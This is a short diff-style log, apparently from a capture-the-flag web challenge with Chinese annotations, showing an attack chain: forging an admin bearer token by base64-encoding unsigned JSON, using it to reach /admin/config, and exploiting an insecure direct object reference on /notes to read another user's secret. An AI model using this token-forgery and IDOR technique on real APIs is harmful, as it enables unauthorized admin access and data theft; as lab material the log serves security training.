@@ -1,0 +1,18 @@
+伪造 admin token:
+  python -c "import base64;print(base64.b64encode(b'{\"uid\": \"2\", \"user\": \"\"}').decode())"
+  => eyJ1aWQiOiAiMiIsICJ1c2VyIjogIiJ9
+  base64 -d => {"uid": "2", "user": ""}
+
+[D] GET /admin/config  (无 token)
+HTTP/1.0 403 Forbidden
+{"error": "admin only"}
+
+[E] GET /admin/config  -H 'Authorization: Bearer eyJ1aWQiOiAiMiIsICJ1c2VyIjogIiJ9'
+HTTP/1.0 200 OK
+Content-Length: 45
+{"flag": "FLAG{api_chain_ok}", "debug": true}
+
+[F] GET /notes?id=2  -H 'Authorization: Bearer eyJ1aWQiOiAiMiIsICJ1c2VyIjogIiJ9'
+{"id": "2", "note": "admin-secret-FLAG{idor_user2}", "viewer": "2"}
+
+主 FLAG (admin config 链终点): FLAG{api_chain_ok}
